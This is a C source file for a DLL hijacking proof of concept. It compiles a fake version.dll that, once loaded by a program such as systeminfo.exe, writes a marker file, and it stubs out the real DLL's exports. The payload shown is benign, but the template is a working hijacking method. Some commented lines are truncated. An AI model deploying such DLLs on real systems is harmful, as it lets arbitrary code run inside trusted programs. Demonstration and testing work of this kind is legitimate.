/*
Name        : version.c
Description : DLL Hijacking PoC that creates a file.
Compile 64  : x86_64-w64-mingw32-gcc -shared -o version.dll version.c
Examples    : C:\Windows\System32\systeminfo.exe (64-bit)
Author      : Lisandre.com
Date        : 2025-04-11
*/
#include <windows.h>
#include <stdio.h>

// DLL Entry Point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        // Log message to verify DLL is loaded
        FILE* f = fopen("C:\\Users\\Public\\dllhijack.txt", "w");
        if (f != NULL) {
            fprintf(f, ">>> DLL Hijacking: It works!\n");
            fclose(f);
        }
    }
    return TRUE;
}

// Simple stubbed-out necessary functions to prevent entry point errors
__declspec(dllexport) BOOL WINAPI GetFileVersionInfoA(LPCSTR, DWORD, DWORD, LPVOID) { return TRUE; }
__declspec(dllexport) BOOL WINAPI GetFileVersionInfoByHandle(HANDLE, LPVOID) { return TRUE; }
__declspec(dllexport) BOOL WINAPI GetFileVersionInfoExA(DWORD, LPCSTR, DWORD, DWORD, LPVOID) { return TRUE; }
__declspec(dllexport) BOOL WINAPI GetFileVersionInfoExW(DWORD, LPCWSTR, DWORD, DWORD, LPVOID) { return TRUE; }
__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeA(LPCSTR, LPDWORD) { return 0; }
__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeExA(DWORD, LPCSTR, LPDWORD) { return 0; }
__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeExW(DWORD, LPCWSTR, LPDWORD) { return 0; }
__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeW(LPCWSTR, LPDWORD) { return 0; }
__declspec(dllexport) BOOL WINAPI GetFileVersionInfoW(LPCWSTR, DWORD, DWORD, LPVOID) { return TRUE; }
//__declspec(dllexport) DWORD WINAPI VerFindFileA(DWORD, LPCSTR, LPCSTR, LPCSTR, LPSTR, PUINT, LPSTR, PUINT) { return 0; }
//__declspec(dllexport) DWORD WINAPI VerFindFileW(DWORD, LPCWSTR, LPCWSTR, LPCWSTR, LPWSTR, PUINT, LPWSTR, PUINT) { return>
//__declspec(dllexport) DWORD WINAPI VerInstallFileA(DWORD, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPSTR, PUINT) { return>
//__declspec(dllexport) DWORD WINAPI VerInstallFileW(DWORD, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPWSTR, PUINT) { >
// These two were conflicting with the KERNEL32 imports
__declspec(dllexport) DWORD WINAPI VerLanguageNameA(DWORD, LPSTR, DWORD) { return 0; }
__declspec(dllexport) DWORD WINAPI VerLanguageNameW(DWORD, LPWSTR, DWORD) { return 0; }
// VerQueryValueA and VerQueryValueW are stubbed out as well
__declspec(dllexport) BOOL WINAPI VerQueryValueA(LPCVOID, LPCSTR, LPVOID*, PUINT) { return TRUE; }
__declspec(dllexport) BOOL WINAPI VerQueryValueW(LPCVOID, LPCWSTR, LPVOID*, PUINT) { return TRUE; }
